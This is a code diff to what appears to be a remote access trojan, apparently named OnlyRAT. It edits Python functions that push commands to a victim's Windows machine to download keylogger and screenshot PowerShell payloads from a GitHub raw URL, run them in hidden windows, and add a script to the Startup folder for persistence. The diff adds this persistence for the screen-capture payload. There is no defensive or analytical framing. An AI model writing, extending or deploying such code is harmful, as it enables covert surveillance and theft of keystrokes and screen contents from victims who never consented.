@@ -152,7 +152,7 @@ def keylogger(address, password, username, working):
     print("\n[*] Prepping keylogger...")
     # web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile GiLqXiexKP.cmd"
+    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo \"powershell Start-Process powershell.exe -windowstyle hidden $env:temp/KHRgMHYmdT.ps1\" >> GiLqXiexKP.cmd"
     print("[+] Keylogger prepped")
 
     # installing keylogger
@@ -294,8 +294,11 @@ def cli(arguments):
             elif option == "3":
                 print("\n[*] Installing screen capture...")
                 install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
+                add_to_startup = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo \"powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1\" >> GiLqXiexKP.cmd"
 
                 remote_command(ipv4, password, install_screencaputre)
+                remote_command(ipv4, password, add_to_startup)
+
                 print("[+] ScreenCapture installed\n")
 
             # take screenshot option
@@ -362,4 +365,5 @@ def main():
 
 # runs main code
 if __name__ == "__main__":
+    # runs main function
     main()
